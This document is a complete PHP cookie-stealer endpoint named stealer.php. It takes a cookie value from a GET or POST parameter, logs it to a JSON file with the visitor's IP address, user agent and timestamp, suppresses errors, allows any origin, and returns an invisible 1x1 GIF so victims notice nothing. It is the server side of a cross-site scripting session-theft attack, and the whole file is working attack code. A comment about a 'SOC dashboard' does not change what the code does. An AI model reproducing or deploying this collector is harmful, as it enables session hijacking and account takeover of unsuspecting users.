<?php
// stealer.php
error_reporting(0);
header("Access-Control-Allow-Origin: *");
header("Cache-Control: no-cache, no-store, must-revalidate");

$log_file = 'captured.json';

// Get cookie from GET or POST
$cookie = isset($_GET['c']) ? $_GET['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

// If cookie consists of some data
if (!empty($cookie)) {
    // Collect extra intel for the SOC dashboard
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    
    // Read existing
    $data = [];
    if (file_exists($log_file)) {
        $raw = file_get_contents($log_file);
        $data = json_decode($raw, true) ?: [];
    }
    
    // Append new data
    $data[] = [
        'time' => $time,
        'ip' => $ip,
        'user_agent' => $user_agent,
        'cookie' => $cookie
    ];

    // Safely write to file
    $fp = fopen($log_file, 'w');
    if (flock($fp, LOCK_EX)) {
        fwrite($fp, json_encode($data));
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

// Return transparent 1x1 image so the user doesn't notice anything broken
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
